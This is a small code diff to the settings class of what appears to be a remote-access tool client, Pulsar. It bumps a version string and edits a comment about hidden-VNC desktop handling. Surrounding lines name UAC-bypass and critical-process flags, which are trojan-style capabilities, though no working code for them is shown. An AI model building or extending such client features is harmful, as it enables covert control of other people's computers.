@@ -15,7 +15,7 @@ namespace Pulsar.Client.Config
     public static class Settings
     {
     // Version string reported to the server regardless of assembly metadata.
-    private const string VersionOverride = "2.2.4";
+    private const string VersionOverride = "2.2.5";
 
 #if DEBUG
         public static string VERSION = "1.0.0";
@@ -47,7 +47,7 @@ namespace Pulsar.Client.Config
         public static bool UACBYPASS = false;
         public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)
 
-        // needed for hvnc
+        // needed for hvnc (why?) why not use the desktop pointer directly?
         public static IntPtr OriginalDesktopPointer = IntPtr.Zero;
 
         public static bool Initialize()
